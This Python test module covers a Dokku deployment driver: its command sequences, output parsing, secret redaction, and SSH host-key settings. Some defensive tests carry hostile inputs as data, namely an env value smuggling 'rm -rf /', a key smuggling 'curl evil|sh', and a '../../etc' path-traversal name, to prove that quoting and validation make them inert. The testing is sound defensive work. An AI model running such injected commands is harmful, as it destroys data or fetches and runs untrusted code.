# tests/ship_engine/test_dokku_driver.py — DokkuDriver specifics (SHIP-1):
# the command surface it issues, its Dokku-CLI parsing, and the redaction
# chokepoint. Everything engine-AGNOSTIC lives in test_contract.py — this
# module is allowed to know Dokku commands and transcript contents.
#
# The redaction tests are the security gate: the transcripts deliberately
# carry secrets (config:set echoes env values; dokku-mongo prints the DSN
# password), each test first PROVES the secret entered the chokepoint, then
# asserts it never reached a log record, an exception, or a DTO.
#
# Created 2026-07-21 (feat/ship-1-engine-contract): new module.
# Updated 2026-07-21 (review fixes): direct redact() unit tests (URL password
#   containing '@', shlex-quoted value with single quotes); whole-pair env
#   quoting tests (hostile value through the driver, hostile key through
#   _env_pairs); AsyncSSHTransport known_hosts kwarg tests; unparseable
#   ps:report -> CommandFailed test.

from __future__ import annotations

import importlib
import logging
import shlex

import pytest
from pocketpaw_ee.ship_engine import (
    AppSpec,
    CommandFailed,
    DeployRequest,
    GitSource,
    InvalidSpec,
    SourceSpec,
    VerbNotSupported,
)
from pocketpaw_ee.ship_engine.dokku import (
    AsyncSSHTransport,
    DokkuDriver,
    _env_pairs,
    _tokenized_git_url,
    redact,
)
from pocketpaw_ee.ship_engine.transcripts import FakeSSHTransport, load_transcript

from tests.ship_engine import contract as c
from tests.ship_engine.dokku_wiring import (
    HAPPY_REPLIES,
    SECRET_MARKERS,
    make_happy_transport,
)

_DOKKU_LOGGER = "pocketpaw_ee.ship_engine.dokku"
_VOL = f"{c.APP}-data"  # a Wave 3 storage-entry name for the standard app


# --------------------------------------------------------------------- #
# Verb ownership + command surface
# --------------------------------------------------------------------- #


async def test_provision_box_raises_verb_not_supported() -> None:
    driver = DokkuDriver(make_happy_transport())
    with pytest.raises(VerbNotSupported) as exc_info:
        await driver.provision_box(c.BOX_SPEC)
    assert exc_info.value.verb == "provision_box"
    assert exc_info.value.engine == "dokku"


async def test_deploy_creates_missing_app_then_deploys() -> None:
    transport = make_happy_transport()
    result = await DokkuDriver(transport).deploy_app(c.DEPLOY_REQUEST)
    assert transport.calls == [
        f"dokku apps:exists {c.APP}",
        f"dokku apps:create {c.APP}",
        f"dokku config:set --no-restart {c.APP} "
        "API_KEY=hunter2-super-secret-value MONGO_PASSWORD=passw0rd-abc",
        f"dokku git:from-image {c.APP} {c.IMAGE}",
    ]
    assert result.app_url == "http://demo.paw.example"


async def test_deploy_skips_create_when_app_exists() -> None:
    replies = {**HAPPY_REPLIES, f"dokku apps:exists {c.APP}": "apps_exists_ok.txt"}
    transport = FakeSSHTransport(replies)
    await DokkuDriver(transport).deploy_app(c.DEPLOY_REQUEST)
    assert f"dokku apps:create {c.APP}" not in transport.calls


# --------------------------------------------------------------------- #
# deploy_source — build from a git repo (SHIP-14)
# --------------------------------------------------------------------- #

# The EXACT tokenized clone URL the driver builds for the standard GitSource.
_TOKENIZED_GIT_URL = f"https://x-access-token:{c.GIT_TOKEN}@github.com/paw-demo/app.git"


async def test_deploy_source_creates_app_sets_env_then_git_syncs() -> None:
    transport = make_happy_transport()
    result = await DokkuDriver(transport).deploy_source(c.APP_SPEC, c.GIT_SOURCE)
    assert transport.calls == [
        f"dokku apps:exists {c.APP}",
        f"dokku apps:create {c.APP}",
        f"dokku config:set --no-restart {c.APP} "
        "API_KEY=hunter2-super-secret-value MONGO_PASSWORD=passw0rd-abc",
        f"dokku git:sync --build {c.APP} {_TOKENIZED_GIT_URL} {c.GIT_REF}",
    ]
    # The result carries the PLAIN repo_url as provenance, never the tokenized one.
    assert result.image == c.GIT_REPO
    assert result.app_url == "http://demo.paw.example"


async def test_deploy_source_public_repo_uses_a_plain_url() -> None:
    # token=None → a public repo → the clone URL has no injected credential.
    plain_cmd = f"dokku git:sync --build {c.APP} {c.GIT_REPO} main"
    replies = {
        f"dokku apps:exists {c.APP}": "apps_exists_ok.txt",  # exists → no create
        plain_cmd: "git_sync.txt",
    }
    transport = FakeSSHTransport(replies)
    source = GitSource(repo_url=c.GIT_REPO, ref="main", token=None)
    await DokkuDriver(transport).deploy_source(AppSpec(name=c.APP), source)
    assert plain_cmd in transport.calls
    assert not any("x-access-token" in call for call in transport.calls)


async def test_deploy_source_token_never_reaches_log_output(
    caplog: pytest.LogCaptureFixture,
) -> None:
    # Sanity first: the token really flows through the chokepoint in the clone
    # URL — otherwise this test proves nothing.
    caplog.set_level(logging.DEBUG, logger=_DOKKU_LOGGER)
    transport = make_happy_transport()
    await DokkuDriver(transport).deploy_source(c.APP_SPEC, c.GIT_SOURCE)

    assert any(c.GIT_TOKEN in call for call in transport.calls)  # entered
    assert c.GIT_TOKEN not in caplog.text  # never logged
    assert "[redacted]@" in caplog.text  # the URL-credential redaction ran


async def test_deploy_source_build_failure_maps_to_command_failed() -> None:
    # A build failure (nonzero git:sync exit) surfaces as CommandFailed with the
    # redacted stderr tail — never a silent hang. The token stays scrubbed.
    git_sync_cmd = f"dokku git:sync --build {c.APP} {_TOKENIZED_GIT_URL} {c.GIT_REF}"
    replies = {**HAPPY_REPLIES, git_sync_cmd: "git_sync_build_fail.txt"}
    with pytest.raises(CommandFailed) as exc_info:
        await DokkuDriver(FakeSSHTransport(replies)).deploy_source(c.APP_SPEC, c.GIT_SOURCE)
    exc = exc_info.value
    assert exc.exit_code == 1
    assert "buildpack" in exc.stderr_tail  # the real build-failure hint survives
    assert "[redacted]@" in exc.command  # the tokenized URL was scrubbed
    assert c.GIT_TOKEN not in str(exc)


async def test_deploy_source_rejects_an_unknown_source_kind() -> None:
    # Only GitSource is wired in v1; a bare SourceSpec is a typed contract error.
    with pytest.raises(InvalidSpec):
        await DokkuDriver(make_happy_transport()).deploy_source(AppSpec(name=c.APP), SourceSpec())


def test_tokenized_git_url_public_passes_through() -> None:
    assert _tokenized_git_url("https://github.com/o/r.git", None) == "https://github.com/o/r.git"


def test_tokenized_git_url_injects_x_access_token() -> None:
    out = _tokenized_git_url("https://github.com/o/r.git", "tok123")
    assert out == "https://x-access-token:tok123@github.com/o/r.git"


def test_tokenized_git_url_leaves_non_https_untouched() -> None:
    # A token is meaningless on a non-https URL — don't mangle it.
    assert _tokenized_git_url("git://host/o/r.git", "tok") == "git://host/o/r.git"


def test_tokenized_git_url_encodes_reserved_characters() -> None:
    # A token with a '/' must be percent-encoded so it can't break the URL nor
    # smuggle a path segment past the scheme://userinfo@ redaction.
    out = _tokenized_git_url("https://github.com/o/r.git", "a/b@c")
    assert "a/b@c" not in out
    assert out == "https://x-access-token:a%2Fb%40c@github.com/o/r.git"
    # And the redaction still scrubs the whole userinfo.
    assert redact(out) == "https://[redacted]@github.com/o/r.git"


async def test_backup_exports_then_sizes_the_dump() -> None:
    transport = make_happy_transport()
    result = await DokkuDriver(transport).backup(c.SERVICE, c.BACKUP_PATH)
    assert transport.calls == [
        f"dokku mongo:export {c.SERVICE} > {c.BACKUP_PATH}",
        f"stat -c%s {c.BACKUP_PATH}",
    ]
    assert result.size_bytes == 4194304


async def test_metrics_parses_ps_report_and_df() -> None:
    result = await DokkuDriver(make_happy_transport()).metrics(c.APP)
    assert result.deployed is True
    assert result.running is True
    assert result.processes == 1
    assert result.disk_used_pct == 38.0
    # Real per-container CPU/mem from `docker stats` (SHIP-12), rounded to 1dp.
    assert result.cpu_pct == 12.3
    assert result.mem_pct == 5.6


async def test_db_create_reports_env_var_name_not_dsn() -> None:
    result = await DokkuDriver(make_happy_transport()).db_create(c.APP, c.SERVICE)
    assert result.exposed_env_var == "MONGO_URL"


# --------------------------------------------------------------------- #
# Wave 3 (SHIP-18) — resource limits, volumes, lifecycle
# --------------------------------------------------------------------- #


async def test_set_resources_issues_limit_with_both_flags() -> None:
    cmd = f"dokku resource:limit --cpu 1000 --memory 512 {c.APP}"
    transport = FakeSSHTransport({cmd: "resource_limit.txt"})
    result = await DokkuDriver(transport).set_resources(c.APP, cpu=1000, memory_mb=512)
    assert transport.calls == [cmd]
    assert result.cpu == 1000
    assert result.memory_mb == 512


async def test_set_resources_omits_the_unset_dimension() -> None:
    cmd = f"dokku resource:limit --memory 512 {c.APP}"
    transport = FakeSSHTransport({cmd: "resource_limit.txt"})
    result = await DokkuDriver(transport).set_resources(c.APP, memory_mb=512)
    assert transport.calls == [cmd]
    assert result.cpu == 0
    assert result.memory_mb == 512


async def test_set_resources_rejects_an_all_zero_call() -> None:
    with pytest.raises(InvalidSpec):
        await DokkuDriver(FakeSSHTransport({})).set_resources(c.APP)


async def test_create_volume_creates_then_mounts() -> None:
    create = f"dokku storage:create {_VOL}"
    mount = f"dokku storage:mount {c.APP} {_VOL} --container-dir /data"
    transport = FakeSSHTransport({create: "storage_create.txt", mount: "storage_mount.txt"})
    result = await DokkuDriver(transport).create_volume(c.APP, name=_VOL, mount_path="/data")
    assert transport.calls == [create, mount]
    assert result.mount_path == "/data"
    assert result.host_path == f"/var/lib/dokku/data/storage/{_VOL}"


async def test_create_volume_rejects_a_relative_mount_path() -> None:
    with pytest.raises(InvalidSpec):
        await DokkuDriver(FakeSSHTransport({})).create_volume(c.APP, name=_VOL, mount_path="data")


async def test_create_volume_rejects_a_mount_path_with_a_colon() -> None:
    # ``:`` is Dokku's host:container separator — a mount path can't smuggle one.
    with pytest.raises(InvalidSpec):
        await DokkuDriver(FakeSSHTransport({})).create_volume(c.APP, name=_VOL, mount_path="/a:/b")


async def test_create_volume_rejects_a_hostile_name() -> None:
    with pytest.raises(InvalidSpec):
        await DokkuDriver(FakeSSHTransport({})).create_volume(
            c.APP, name="../../etc", mount_path="/data"
        )


async def test_restart_issues_ps_restart() -> None:
    cmd = f"dokku ps:restart {c.APP}"
    transport = FakeSSHTransport({cmd: "ps_restart.txt"})
    result = await DokkuDriver(transport).restart(c.APP)
    assert transport.calls == [cmd]
    assert result.action == "restart"


async def test_rebuild_issues_ps_rebuild() -> None:
    cmd = f"dokku ps:rebuild {c.APP}"
    transport = FakeSSHTransport({cmd: "ps_rebuild.txt"})
    result = await DokkuDriver(transport).rebuild(c.APP)
    assert transport.calls == [cmd]
    assert result.action == "rebuild"


# --------------------------------------------------------------------- #
# Redaction — the security gate
# --------------------------------------------------------------------- #


async def test_secrets_never_reach_log_output(caplog: pytest.LogCaptureFixture) -> None:
    # Sanity first: the secrets really do flow through the chokepoint — the
    # config:set COMMAND carries the env values, and the mongo transcripts
    # echo both them and the DSN password. Otherwise this test proves nothing.
    assert SECRET_MARKERS[0] in c.ENV["API_KEY"]
    assert SECRET_MARKERS[2] in load_transcript("mongo_create.txt").stdout
    assert SECRET_MARKERS[0] in load_transcript("config_set.txt").stdout

    caplog.set_level(logging.DEBUG, logger=_DOKKU_LOGGER)
    transport = make_happy_transport()
    driver = DokkuDriver(transport)
    await driver.deploy_app(c.DEPLOY_REQUEST)
    await driver.db_create(c.APP, c.SERVICE)

    assert any(SECRET_MARKERS[0] in call for call in transport.calls)  # entered
    for marker in SECRET_MARKERS:
        assert marker not in caplog.text, f"secret {marker!r} leaked into logs"
    assert "[redacted]" in caplog.text  # redaction actually ran


async def test_command_failed_redacts_the_command() -> None:
    config_cmd = next(cmd for cmd in HAPPY_REPLIES if "config:set" in cmd)
    replies = {**HAPPY_REPLIES, config_cmd: "config_set_fail.txt"}
    with pytest.raises(CommandFailed) as exc_info:
        await DokkuDriver(FakeSSHTransport(replies)).deploy_app(c.DEPLOY_REQUEST)
    exc = exc_info.value
    assert "API_KEY=[redacted]" in exc.command
    for marker in SECRET_MARKERS:
        assert marker not in str(exc)


async def test_command_failed_redacts_the_stderr_tail() -> None:
    replies = {**HAPPY_REPLIES, f"dokku mongo:link {c.SERVICE} {c.APP}": "mongo_link_fail.txt"}
    # Sanity: the failure stderr really contains the DSN password.
    assert SECRET_MARKERS[2] in load_transcript("mongo_link_fail.txt").stderr
    with pytest.raises(CommandFailed) as exc_info:
        await DokkuDriver(FakeSSHTransport(replies)).db_create(c.APP, c.SERVICE)
    exc = exc_info.value
    assert exc.exit_code == 1
    assert "[redacted]@" in exc.stderr_tail
    assert SECRET_MARKERS[2] not in str(exc)


def test_redact_url_password_containing_at() -> None:
    # Userinfo is matched to the LAST '@' before the host, so a password
    # containing '@' is scrubbed whole (no partial tail like 'ss@rd' left).
    out = redact("connecting to mongodb://demo:p@ssw@rd@dokku-mongo:27017/db now")
    assert out == "connecting to mongodb://[redacted]@dokku-mongo:27017/db now"


def test_redact_shlex_quoted_value_with_single_quotes() -> None:
    # shlex.quote splits a value containing quotes into multiple quoted
    # segments ('API_KEY=pa'"'"'ss word') — the whole run must be consumed,
    # not just the first segment.
    secret = "pa'ss word"
    out = redact(f"dokku config:set --no-restart demo {shlex.quote(f'API_KEY={secret}')}")
    assert "[redacted]" in out
    assert "pa" not in out.replace("[redacted]", "")
    assert "ss word" not in out


# --------------------------------------------------------------------- #
# Env pair quoting — belt (whole-pair quote) and suspenders (DTO validation)
# --------------------------------------------------------------------- #


async def test_hostile_env_value_reaches_transport_quoted() -> None:
    value = "pa'ss; rm -rf /"
    request = DeployRequest(app=AppSpec(name=c.APP, env={"NASTY": value}), image=c.IMAGE)
    expected_cmd = f"dokku config:set --no-restart {c.APP} " + shlex.quote(f"NASTY={value}")
    replies = {
        **HAPPY_REPLIES,
        f"dokku apps:exists {c.APP}": "apps_exists_ok.txt",
        expected_cmd: "config_set.txt",
    }
    transport = FakeSSHTransport(replies)
    await DokkuDriver(transport).deploy_app(request)
    # The fake rejects unmapped commands, so reaching this assert proves the
    # driver sent EXACTLY the safely quoted form — nothing unquoted leaked.
    assert expected_cmd in transport.calls


def test_env_pairs_quote_the_key_too() -> None:
    # Defense-in-depth: even if a hostile key ever got past the DTO boundary,
    # whole-pair quoting keeps it one inert argv token — identical argv for
    # dokku, no shell syntax executed.
    hostile_key = "X;curl evil|sh #"
    [pair] = _env_pairs({hostile_key: "v"})
    assert pair == shlex.quote(f"{hostile_key}=v")
    assert shlex.split(pair) == [f"{hostile_key}=v"]  # one token, verbatim


# --------------------------------------------------------------------- #
# Chokepoint mechanics
# --------------------------------------------------------------------- #


async def test_timeout_maps_to_command_failed() -> None:
    transport = FakeSSHTransport(HAPPY_REPLIES, delay=0.05)
    driver = DokkuDriver(transport, timeouts={"logs": 0.01})
    with pytest.raises(CommandFailed) as exc_info:
        await driver.logs(c.APP)
    assert exc_info.value.exit_code == -1
    assert "timed out" in exc_info.value.stderr_tail


async def test_fake_transport_rejects_unmapped_commands() -> None:
    with pytest.raises(AssertionError, match="no transcript"):
        await FakeSSHTransport({}).run("dokku apps:list")


async def test_metrics_unparseable_ps_report_maps_to_command_failed() -> None:
    replies = {**HAPPY_REPLIES, f"dokku ps:report {c.APP}": "ps_report_bad.txt"}
    with pytest.raises(CommandFailed) as exc_info:
        await DokkuDriver(FakeSSHTransport(replies)).metrics(c.APP)
    # The raw unparseable value is named in the error — not a bare ValueError.
    assert "banana" in str(exc_info.value)


async def test_metrics_docker_stats_failure_degrades_to_none() -> None:
    """A `docker stats` failure (old Docker, down container) must NOT fail the
    whole metrics read — process state still comes back, cpu/mem read None."""
    stats_cmd = (
        f"docker stats --no-stream --no-trunc "
        f"--format '{{{{.CPUPerc}}}} {{{{.MemPerc}}}}' --filter name={c.APP}."
    )
    replies = {**HAPPY_REPLIES, stats_cmd: "docker_stats_fail.txt"}
    result = await DokkuDriver(FakeSSHTransport(replies)).metrics(c.APP)
    # Process state survives; resource usage degrades to None (renders "—").
    assert result.deployed is True
    assert result.running is True
    assert result.cpu_pct is None
    assert result.mem_pct is None


# --------------------------------------------------------------------- #
# AsyncSSHTransport host-key posture
# --------------------------------------------------------------------- #


async def _capture_connect_kwargs(
    monkeypatch: pytest.MonkeyPatch, transport: AsyncSSHTransport
) -> dict:
    import asyncssh

    captured: dict = {}

    async def fake_connect(host: str, **kwargs: object) -> object:
        captured["host"] = host
        captured.update(kwargs)
        return object()  # never used as a connection in these tests

    monkeypatch.setattr(asyncssh, "connect", fake_connect)
    await transport._connect()
    return captured


async def test_connect_omits_known_hosts_when_unset(monkeypatch: pytest.MonkeyPatch) -> None:
    # Passing known_hosts=None would DISABLE asyncssh's host-key verification;
    # leaving the kwarg out keeps asyncssh's verify-by-default behavior.
    captured = await _capture_connect_kwargs(monkeypatch, AsyncSSHTransport("box.example"))
    assert "known_hosts" not in captured
    assert captured["host"] == "box.example"


async def test_connect_passes_known_hosts_when_set(monkeypatch: pytest.MonkeyPatch) -> None:
    transport = AsyncSSHTransport("box.example", known_hosts="/etc/paw/known_hosts")
    captured = await _capture_connect_kwargs(monkeypatch, transport)
    assert captured["known_hosts"] == "/etc/paw/known_hosts"


def test_asyncssh_dependency_is_installed() -> None:
    # SHIP-1 adds asyncssh to ee/pyproject.toml; the driver lazy-imports it,
    # so this is the one place the environment claim is actually proven.
    assert importlib.import_module("asyncssh") is not None
